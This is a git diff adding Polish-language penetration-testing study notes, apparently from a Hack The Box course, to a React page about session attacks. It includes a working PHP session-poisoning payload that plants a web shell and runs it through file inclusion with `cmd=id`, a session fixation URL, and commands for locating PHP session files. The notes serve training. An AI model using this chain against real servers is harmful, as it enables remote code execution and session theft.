@@ -3,6 +3,9 @@ import authentication_error from '../../../assets/authentication_error.png';
 import authentication_register_password_rule from '../../../assets/authentication_register_password_rule.png';
 import authentication_reset_token from '../../../assets/authentication_reset_token.png';
 import authentication_session_token from '../../../assets/authentication_session_token.png';
+import authentication_session_fixed from '../../../assets/authentication_session_fixed.png';
+import authentication_trafic from '../../../assets/authentication_trafic.png';
+import authentication_session_db from '../../../assets/authentication_session_db.png';
 import ExampleFrame from '../../exampleFrame/ExampleFrame';
 
 const Authentication = () => {
@@ -123,7 +126,43 @@ const Authentication = () => {
                 <p>{`echo -n 'user=htb-stdnt;role=admin' | base64`}</p>
             </div>
 
+            <hr />
+            <h2>Zatrucie sesji PHP</h2>
 
+            <div className='waring'>
+                <p>Szczegóły te są przechowywane w plikach sesji na zapleczu i zapisane w <span className='important'>/var/lib/php/sessions/</span> w systemie Linux oraz w <span className='important'>C:\Windows\Temp\</span> w systemie Windows. Nazwa pliku zawierającego dane naszego użytkownika odpowiada nazwie naszego pliku cookie PHPSESSID z prefiksem <span className='important'>sess_</span>. Na przykład, jeśli plik cookie PHPSESSID jest ustawiony na <span className='important'>el4ukv0kqbvoirg7nkp4dncpk3</span>, jego lokalizacja na dysku będzie wynosić <span className='important'>/var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3.</span></p>
+            </div>
+
+            <div className='waring'>
+                <p>http://{`<SERVER_IP>:<PORT>`}/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E</p>
+                <p>PHPSESSID zostało zatrute</p>
+                <p>Ponownie wykorzystujemy zatruty plik sess_ </p>
+                <p>http://{`<SERVER_IP>:<PORT>`}/index.php?language=<span className='important'>/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd</span><span className='error'>&cmd=id</span></p>
+            </div>
+            <hr />
+            <h2>Przejmowanie sesji (Session Hijacking)</h2>
+            <p>Polega na przejęciu sesji ofiary i ustawienie jako swojej by zalogować się bez logowania</p>
+
+            <h2>Utrwalanie sesji (Session Fixation)</h2>
+            <p>Polega na przesłaniu ofierze url z zatrutym przez nas tokenem</p>
+            <div className='waring'>
+                <p><span className='important'>http://oredirect.htb.net/?redirect_uri=/complete.html&token={`<RANDOM TOKEN VALUE>`}</span></p>
+            </div>
+            <ExampleFrame screen={authentication_session_fixed}/>
+
+            <h2>Nasłuchiwanie ruchu (Traffic Sniffing)</h2>
+            <ExampleFrame screen={authentication_trafic}/>
+            <h2>Uzyskiwanie identyfikatorów sesji po wykorzystaniu</h2>
+            <h3>PHP</h3>
+            <p>Wpis <span className='important'>session.save_path w PHP.ini</span> określa, gdzie będą przechowywane dane sesji.</p>
+            <div className='waring'>
+                <p>locate php.ini</p>
+                <p>cat /etc/php/7.4/cli/php.ini | grep 'session.save_path'</p>
+                <p>cat /etc/php/7.4/apache2/php.ini | grep 'session.save_path'</p>
+            </div>
+            <p>W naszym <span className='important'>domyślnym</span> przypadku konfiguracji jest to <span className='important'>/var/lib/php/sessions</span>. Pamiętaj, że ofiara musi zostać uwierzytelniona, abyśmy mogli zobaczyć jej identyfikator sesji. Pliki, które będzie wyszukiwał atakujący, mają konwencję nazw <span className='important'>{`sess_<sessionID>`}</span>.</p>
+            <h3>Bazy danych</h3>
+            <ExampleFrame screen={authentication_session_db}/>
         </section>
     )
 };
